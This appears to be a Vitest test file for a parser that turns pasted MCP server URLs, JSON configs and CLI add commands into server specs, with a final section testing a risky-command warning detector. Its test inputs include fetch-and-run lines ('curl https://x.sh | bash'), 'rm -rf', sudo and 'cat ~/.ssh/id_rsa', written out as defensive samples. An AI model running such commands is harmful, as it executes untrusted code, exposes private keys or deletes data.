import { describe, expect, it } from "vitest";
import { cleanName, commandWarnings, MCP_NAME, nameFor, parseMcpInput } from "../src/shared/mcp-add";

describe("cleanName", () => {
  it("lowercases, replaces invalid characters and trims", () => {
    expect(cleanName("My Server!")).toBe("my-server");
    expect(cleanName("__Foo--Bar__")).toBe("foo-bar");
    expect(cleanName("!!!")).toBe("server");
    expect(cleanName("")).toBe("server");
  });

  it("cuts to 40 characters", () => {
    expect(cleanName("a".repeat(60))).toBe("a".repeat(40));
  });
});

describe("nameFor", () => {
  it("derives names from URLs", () => {
    expect(nameFor({ type: "http", url: "https://mcp.linear.app/mcp" })).toBe("linear");
    expect(nameFor({ type: "sse", url: "https://api.githubcopilot.com/mcp" })).toBe("githubcopilot");
    expect(nameFor({ type: "http", url: "https://posara-horizon-t1.dcn01.ctdn.dev/mcp" })).toBe("posara-horizon-t1");
    expect(nameFor({ type: "http", url: "http://localhost:3000/mcp" })).toBe("local");
    expect(nameFor({ type: "http", url: "http://127.0.0.1:8080/mcp" })).toBe("local");
  });

  it("derives names from stdio commands", () => {
    expect(nameFor({ type: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-everything"] })).toBe("everything");
    expect(nameFor({ type: "stdio", command: "uvx", args: ["mcp-server-fetch"] })).toBe("fetch");
    expect(nameFor({ type: "stdio", command: "npx", args: ["-y", "@playwright/mcp@latest"] })).toBe("playwright");
    expect(
      nameFor({ type: "stdio", command: "docker", args: ["run", "-i", "--rm", "-e", "TOKEN", "ghcr.io/github/github-mcp-server"] }),
    ).toBe("github");
    expect(nameFor({ type: "stdio", command: "node", args: ["/path/server.mjs"] })).toBe("server");
  });

  it("always produces a name MCP_NAME accepts", () => {
    expect(MCP_NAME.test(nameFor({ type: "stdio", command: "npx" }))).toBe(true);
    expect(MCP_NAME.test(nameFor({ type: "http", url: "https://mcp.linear.app/mcp" }))).toBe(true);
  });
});

describe("parseMcpInput", () => {
  it("asks for input when empty", () => {
    expect(parseMcpInput("   ")).toEqual({ drafts: [], error: "Paste a URL, a command or JSON config." });
  });

  it("parses a bare URL", () => {
    expect(parseMcpInput("https://mcp.linear.app/mcp")).toEqual({
      drafts: [{ name: "linear", spec: { type: "http", url: "https://mcp.linear.app/mcp" } }],
    });
  });

  it("detects the SSE transport from a /sse URL", () => {
    expect(parseMcpInput("https://example.com/sse")).toEqual({
      drafts: [{ name: "example", spec: { type: "sse", url: "https://example.com/sse" } }],
    });
  });

  it("reports JSON that doesn't parse", () => {
    const out = parseMcpInput("{ not json }");
    expect(out.drafts).toEqual([]);
    expect(out.error).toMatch(/^That looks like JSON but doesn't parse: /);
  });

  it("reports JSON with no servers", () => {
    expect(parseMcpInput("{}")).toEqual({ drafts: [], error: "No MCP servers found in that JSON." });
    expect(parseMcpInput('{"mcpServers":{}}')).toEqual({ drafts: [], error: "No MCP servers found in that JSON." });
    expect(parseMcpInput('{"mcpServers":{"off":{"disabled":true}}}')).toEqual({
      drafts: [],
      error: "No MCP servers found in that JSON.",
    });
  });

  it("parses a Claude-style mcpServers map", () => {
    const text = JSON.stringify({
      mcpServers: {
        linear: { url: "https://mcp.linear.app/mcp" },
        everything: {
          command: "npx",
          args: ["-y", "@modelcontextprotocol/server-everything"],
          env: { FOO: "bar", NUM: 1 },
        },
      },
    });
    expect(parseMcpInput(text)).toEqual({
      drafts: [
        { name: "linear", spec: { type: "http", url: "https://mcp.linear.app/mcp" } },
        {
          name: "everything",
          spec: {
            type: "stdio",
            command: "npx",
            args: ["-y", "@modelcontextprotocol/server-everything"],
            env: { FOO: "bar" },
          },
        },
      ],
    });
  });

  it("parses a VS Code servers map with headers", () => {
    const text = JSON.stringify({
      servers: {
        "my-api": {
          type: "http",
          url: "https://api.example.com/mcp",
          headers: { Authorization: "Bearer x", "X-N": 2 },
        },
      },
    });
    expect(parseMcpInput(text)).toEqual({
      drafts: [
        {
          name: "my-api",
          spec: { type: "http", url: "https://api.example.com/mcp", headers: { Authorization: "Bearer x" } },
        },
      ],
    });
  });

  it("parses an OpenCode mcp map with command arrays and environment", () => {
    const text = JSON.stringify({
      mcp: {
        fetch: { type: "local", command: ["uvx", "mcp-server-fetch"], environment: { TOKEN: "abc" } },
        remote: { type: "remote", url: "https://mcp.example.com/sse", headers: { "X-A": "1" } },
      },
    });
    expect(parseMcpInput(text)).toEqual({
      drafts: [
        { name: "fetch", spec: { type: "stdio", command: "uvx", args: ["mcp-server-fetch"], env: { TOKEN: "abc" } } },
        { name: "remote", spec: { type: "http", url: "https://mcp.example.com/sse", headers: { "X-A": "1" } } },
      ],
    });
  });

  it("parses a single server object", () => {
    expect(parseMcpInput('{"command":"npx","args":["-y","@scope/pkg"]}')).toEqual({
      drafts: [{ name: "pkg", spec: { type: "stdio", command: "npx", args: ["-y", "@scope/pkg"] } }],
    });
    expect(parseMcpInput('{"url":"https://mcp.linear.app/mcp"}')).toEqual({
      drafts: [{ name: "linear", spec: { type: "http", url: "https://mcp.linear.app/mcp" } }],
    });
  });

  it("parses a bare name-to-server map", () => {
    const text = JSON.stringify({
      foo: { command: "uvx", args: ["mcp-server-fetch"] },
      bar: { url: "https://bar.example.com/mcp" },
    });
    expect(parseMcpInput(text)).toEqual({
      drafts: [
        { name: "foo", spec: { type: "stdio", command: "uvx", args: ["mcp-server-fetch"] } },
        { name: "bar", spec: { type: "http", url: "https://bar.example.com/mcp" } },
      ],
    });
  });

  it("de-duplicates names from one paste", () => {
    const text = JSON.stringify({
      mcp: {
        "My Server": { command: "uvx", args: ["a"] },
        "my/server": { command: "uvx", args: ["b"] },
        "my-server": { command: "uvx", args: ["c"] },
      },
    });
    expect(parseMcpInput(text)).toEqual({
      drafts: [
        { name: "my-server", spec: { type: "stdio", command: "uvx", args: ["a"] } },
        { name: "my-server-2", spec: { type: "stdio", command: "uvx", args: ["b"] } },
        { name: "my-server-3", spec: { type: "stdio", command: "uvx", args: ["c"] } },
      ],
    });
  });

  it("parses `claude mcp add` with an http URL and a header", () => {
    expect(
      parseMcpInput('claude mcp add --transport http linear --header "Authorization: Bearer abc" https://mcp.linear.app/mcp'),
    ).toEqual({
      drafts: [
        {
          name: "linear",
          spec: { type: "http", url: "https://mcp.linear.app/mcp", headers: { Authorization: "Bearer abc" } },
        },
      ],
    });
  });

  it("parses `claude mcp add` with env and a `--` command", () => {
    expect(parseMcpInput("claude mcp add --transport stdio fetch -e TOKEN=abc -- uvx mcp-server-fetch")).toEqual({
      drafts: [
        { name: "fetch", spec: { type: "stdio", command: "uvx", args: ["mcp-server-fetch"], env: { TOKEN: "abc" } } },
      ],
    });
  });

  it("parses `codex mcp add` with an SSE URL", () => {
    expect(parseMcpInput("codex mcp add --transport sse remote https://example.com/sse")).toEqual({
      drafts: [{ name: "remote", spec: { type: "sse", url: "https://example.com/sse" } }],
    });
  });

  it("parses a command line with leading KEY=value env", () => {
    expect(parseMcpInput("TOKEN=abc uvx mcp-server-fetch")).toEqual({
      drafts: [{ name: "fetch", spec: { type: "stdio", command: "uvx", args: ["mcp-server-fetch"], env: { TOKEN: "abc" } } }],
    });
  });

  it("errors when a command line has no command", () => {
    expect(parseMcpInput("FOO=bar")).toEqual({ drafts: [], error: "Enter the command that starts the server." });
  });
});

describe("commandWarnings", () => {
  it("is empty for remote servers and clean commands", () => {
    expect(commandWarnings({ type: "http", url: "https://mcp.linear.app/mcp" })).toEqual([]);
    expect(commandWarnings({ type: "stdio", command: "npx", args: ["-y", "@modelcontextprotocol/server-everything"] })).toEqual([]);
  });

  it("flags sudo", () => {
    expect(commandWarnings({ type: "stdio", command: "sudo", args: ["npx", "x"] })).toEqual([
      "Runs with administrator rights (sudo).",
    ]);
  });

  it("flags rm -rf variants", () => {
    expect(commandWarnings({ type: "stdio", command: "rm", args: ["-rf", "/tmp"] })).toEqual(["Deletes files (rm -rf)."]);
    expect(commandWarnings({ type: "stdio", command: "rm", args: ["-fr", "/tmp"] })).toEqual(["Deletes files (rm -rf)."]);
    expect(commandWarnings({ type: "stdio", command: "rm", args: ["-Rf", "/tmp"] })).toEqual(["Deletes files (rm -rf)."]);
  });

  it("flags a downloaded script", () => {
    expect(commandWarnings({ type: "stdio", command: "curl", args: ["-fsSL", "https://x.sh", "|", "bash"] })).toEqual([
      "Downloads a script and runs it.",
      "Has shell operators; they only run if the command is itself a shell.",
    ]);
  });

  it("flags shell operators", () => {
    expect(commandWarnings({ type: "stdio", command: "echo", args: ["hi;", "there"] })).toEqual([
      "Has shell operators; they only run if the command is itself a shell.",
    ]);
  });

  it("flags sensitive paths", () => {
    expect(commandWarnings({ type: "stdio", command: "cat", args: ["~/.ssh/id_rsa"] })).toEqual([
      "Touches sensitive files (keys, credentials or system config).",
    ]);
  });

  it("flags a shell command", () => {
    expect(commandWarnings({ type: "stdio", command: "/bin/zsh" })).toEqual(["Runs a shell."]);
    expect(commandWarnings({ type: "stdio", command: "bash", args: ["-c", "curl https://x.sh | bash"] })).toEqual([
      "Downloads a script and runs it.",
      "Has shell operators; they only run if the command is itself a shell.",
      "Runs a shell.",
    ]);
  });
});
